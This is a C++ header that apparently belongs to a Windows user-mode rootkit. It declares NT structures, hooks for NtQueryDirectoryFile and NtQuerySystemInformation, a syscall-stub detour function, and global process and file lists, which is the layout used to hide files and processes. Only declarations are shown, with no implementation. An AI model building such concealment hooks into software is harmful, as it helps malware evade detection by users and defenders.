#pragma once

#include "sub/sub.h"

// Define NTSTATUS
typedef _Return_type_success_(return >= 0) long NTSTATUS;

constexpr u32 RoundUpToMulOfPow2(u32 num, u32 mul) {
	return (num + (mul - 1)) & (0 - mul);
}

namespace nt {
	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWCH   Buffer;
	} UNICODE_STRING, * PUNICODE_STRING;
	typedef struct _CLIENT_ID {
		HANDLE UniqueProcess;
		HANDLE UniqueThread;
	} CLIENT_ID;



	typedef enum _FILE_INFORMATION_CLASS {
		FileDirectoryInformation = 1,
		FileFullDirectoryInformation = 2,
		FileBothDirectoryInformation = 3,
		FileIdBothDirectoryInformation = 37,
		FileIdFullDirectoryInformation = 38,
		FileNamesInformation = 12,
		FileObjectIdInformation = 29,
		FileReparsePointInformation = 33
	} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;
	typedef NTSTATUS(NTAPI* NtQueryDirectoryFile_t)(
		_In_                       HANDLE  FileHandle,
		_In_opt_                   HANDLE  Event,
		_In_opt_                   PVOID   ApcRoutine,
		_In_opt_                   PVOID   ApcContext,
		_Out_                      PVOID   IoStatusBlock,
		_Out_writes_bytes_(Length) PVOID   FileInformation,
		_In_                       ULONG   Length,
		_In_                       ULONG   FileInformationClass,
		_In_                       BOOLEAN ReturnSingleEntry,
		_In_opt_                   PVOID   FileName,
		_In_                       BOOLEAN RestartScan
		);

	typedef struct _SYSTEM_PROCESS_INFORMATION {
		ULONG NextEntryOffset;
		ULONG NumberOfThreads;
		BYTE Reserved1[48];
		UNICODE_STRING ImageName;
		ULONG BasePriority;
		HANDLE UniqueProcessId;
		PVOID Reserved2;
		ULONG HandleCount;
		ULONG SessionId;
		PVOID Reserved3;
		SIZE_T PeakVirtualSize;
		SIZE_T VirtualSize;
		ULONG Reserved4;
		SIZE_T PeakWorkingSetSize;
		SIZE_T WorkingSetSize;
		PVOID Reserved5;
		SIZE_T QuotaPagedPoolUsage;
		PVOID Reserved6;
		SIZE_T QuotaNonPagedPoolUsage;
		SIZE_T PagefileUsage;
		SIZE_T PeakPagefileUsage;
		SIZE_T PrivatePageCount;
		LARGE_INTEGER Reserved7[6];
	} SYSTEM_PROCESS_INFORMATION;
	typedef struct _SYSTEM_THREAD_INFORMATION {
		LARGE_INTEGER Reserved1[3];
		ULONG Reserved2;
		PVOID StartAddress;
		CLIENT_ID ClientId;
		ULONG Priority;
		LONG BasePriority;
		ULONG Reserved3;
		ULONG ThreadState;
		ULONG WaitReason;
	} SYSTEM_THREAD_INFORMATION;
	typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
		_In_      ULONG  SystemInformationClass,
		_Out_     PVOID  SystemInformation,
		_In_      ULONG  SystemInformationLength,
		_Out_opt_ PULONG ReturnLength
		);
}

namespace hk {
	extern nt::NtQueryDirectoryFile_t NtQueryDirectoryFile;
	NTSTATUS NTAPI NtQueryDirectoryFileHook(
		_In_ HANDLE FileHandle, _In_opt_ HANDLE Event, _In_opt_ PVOID ApcRoutine, _In_opt_ PVOID ApcContext, _Out_ PVOID IoStatusBlock,
		_Out_writes_bytes_(Length) PVOID FileInformation, _In_ ULONG Length, _In_ ULONG FileInformationClass,
		_In_ BOOLEAN ReturnSingleEntry, _In_opt_ nt::PUNICODE_STRING FileName, _In_ BOOLEAN RestartScan
	);
	extern nt::NtQuerySystemInformation_t NtQuerySystemInformation;
	NTSTATUS NTAPI NtQuerySystemInformationHook(
		_In_      ULONG  SystemInformationClass,
		_Out_     PVOID  SystemInformation,
		_In_      ULONG  SystemInformationLength,
		_Out_opt_ PULONG ReturnLength
	);
}

namespace dt {
	status DetourSyscallStub(_In_ void** ppTarget, _In_ void* pHook);
}

namespace vec {
	class AnyVector {
		struct Entry {
			size_t Size;
			byte   Data[];
		};

	public:
		AnyVector();
		~AnyVector();

		void* AllocateObject(_In_ size_t nSize);
		void FreeObject(_In_ void* p);

		u32 GetItemCount();
		void* GetFirstEntry();
		void* GetNextEntry(_In_ void* p);

		void ReadLock();
		void ReadUnlock();
		void WriteLock();
		void WriteUnlock();

	private:
		status ResizeVector(_In_ size_t nSize);

		void*   m_Vec;                // Address of Vector
		size_t  m_Used = 0;           // Size in bytes Used (this allso describes the current offset as there're no possible caves,
						              // everything is contiguous and will be compacted as soon as possible)
		size_t  m_Size;               // Size of Table that is commited
		u32  m_Count = 0;          // Number of Elements stored inside the Vector
		SRWLOCK m_srw = SRWLOCK_INIT; // Slim Read/Write Lock for Thread Synchronization
	};
}

// NoCRT Allocators for Objects
void* __cdecl operator new(size_t size);
void __cdecl operator delete(void* mem);


inline vec::AnyVector* g_ProcessList;
inline vec::AnyVector* g_FileList;
// inline vec::AnyVector* RegistryList;

// Current Module BaseAddress
inline void* g_BaseAddress;
